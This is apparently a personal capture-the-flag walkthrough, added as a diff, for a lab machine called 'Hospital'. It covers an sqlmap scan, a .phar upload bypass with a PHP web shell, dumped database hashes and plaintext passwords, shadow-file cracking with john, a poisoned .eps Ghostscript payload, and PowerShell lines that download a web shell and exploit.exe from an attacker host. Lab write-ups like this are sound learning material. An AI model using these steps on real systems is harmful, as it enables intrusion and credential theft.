@@ -1,0 +1,118 @@
+https://10.10.11.241/ --> Login Page
+
+--- XAMPP ---
+Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+X-Powered-By: PHP/8.0.28
+-------------
+
+Roundcube is a web-based IMAP email client. Roundcube's most prominent feature is the pervasive use of Ajax technology. ==> 443 uses this
+
+https sqlmapping :: sqlmap -r login.req --force-ssl --level 5 --risk 3 --batch
+
+http://10.10.11.241:8080/ ==> Different Web Page
+
+Theres a login/register
+You can also submit files to the server, may be some file upload stuff happening
+
+When you upload files, they go into the http://10.10.11.241:8080/uploads/<filename>
+
+Somehow, this box concerning its web section, acts like Linux: so we need to attack it like its a linux machine.
+
+https://www.whitewinterwolf.com/tags/php-webshell/ ==> Very Nice PHP Web-Shell
+
+To bypass this file upload, we simple need to change the file ending to .phar
+
+Inside the config.php we got creds
+{
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'root');
+define('DB_PASSWORD', 'my$qls3rv1c3!');
+define('DB_NAME', 'hospital');
+}
+
+mysql -h localhost -u root -p
+
+MariaDB [hospital]> select * from users;
++----+----------+--------------------------------------------------------------+---------------------+
+| id | username | password                                                     | created_at          |
++----+----------+--------------------------------------------------------------+---------------------+
+|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
+|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
++----+----------+--------------------------------------------------------------+---------------------+
+|  3 | ender    | $2y$10$kxu8A8DunE0PJ5Yvl3Nvv.ElPm/rEqyW0WJ1CfFWvDyIAIdVfxaBy | 2023-11-20 00:55:42 |
+|  4 | lanfran  | $2y$10$CIOyVd0D90g1tWo5fePVqO6JcbEVHCGS28NcjmHZt0AJqazZuaqjG | 2023-11-20 00:56:18 |
+|  5 | destiny  | $2y$10$JnGRcgRcyYdbjxCO4av7Gu7jcwVSK.jX6LH9nMu3KBGq06giCwGsS | 2023-11-20 00:59:12 |
+|  6 | notadmin | $2y$10$GXueiPB9E2E/YXeyxEi2ZupDerCaqKHiORTzPRInAGJuDEavWn6NS | 2023-11-20 01:12:36 |
+|  7 | huhuhu   | $2y$10$shWMYapl70aLjOESSqm5LeSwvaEkq.cJ.zcuxJiTVCKGQfWjgGF6W | 2023-11-20 01:15:46 |
++----+----------+--------------------------------------------------------------+---------------------+
+
+This hashes deal with the 8080 port
+
+Using the gameoverlay linux kernel enum exploit, we can gain a shell as root, once we are root, now we are in some kind of container
+we can actually crack passwords inside the /etc/shadow
+
+we will need a copy of /etc/passwd and /etc/shadow, then we can run:
+
+unshadow passwd.txt shadow.txt > shadCreds.txt ==> makes format john can crack
+john --wordlist=/usr/share/wordlists/rockyou.txt shadCreds.txt ==> cracks hashes
+
+drwilliams@hospital.htb:qwe123!@# ==> ssh into webmaster
+
+drwilliams:qwe123!@# ==> Login for https website!
+
+drbrown@hospital.htb ==> user on a different section of the hospital network
+
+============================================
+Roundcube Webmail 1.6.4
+
+Installed plugins
+------------------------------------------
+Plugin	 		Version		License	Source
+------------------------------------------
+filesystem_attachments	1.0		GPL-3.0+	
+jqueryui		1.13.2		GPL-3.0+
+============================================
+
+Roundcube Mail Content {
+
+Dear Lucy,
+
+I wanted to remind you that the project for lighter, cheaper and
+environmentally friendly needles is still ongoing 💉. You are the one in
+charge of providing me with the designs for these so that I can take
+them to the 3D printing department and start producing them right away.
+Please make the design in an ".eps" file format so that it can be well
+visualized with GhostScript.
+
+Best regards,
+Chris Brown.
+
+}
+
+Main goal of the pwn is to give them a poisoned .eps file.
+We can use a python script from github to generate a base template to then inject the common but effective b64 encoded payload into it, using another python script.
+
+Instantly we get a shell as drBrown on the box and we can swipe the userflag
+=========================================================
+
+Viwing the bat file there is a possible password `chr!$br0wn`
+Cannot seem to evilwin-rm into the box using drbrown.HOSPITAL:chr!$br0wn
+
+Inside the windows system there are a few user folders:
+	Administrator
+	drbrown
+	drbrown.HOSPITAL
+	drwilliams
+	drwilliams.HOSPITAL
+	
+User: xampp-dav-unsecure
+Password: ppmax2011
+
+We can write inside the root web directory in the https section of the website
+
+iwr http://10.10.14.201:80/wolfy.php -outfile ./wolfy.php
+
+We get can send a command to get a shell as administrator [UNINTENDED ROUTE]
+
+iwr http://10.10.14.201:80/exploit.exe -outfile ./exploit.exe ==> download and save file
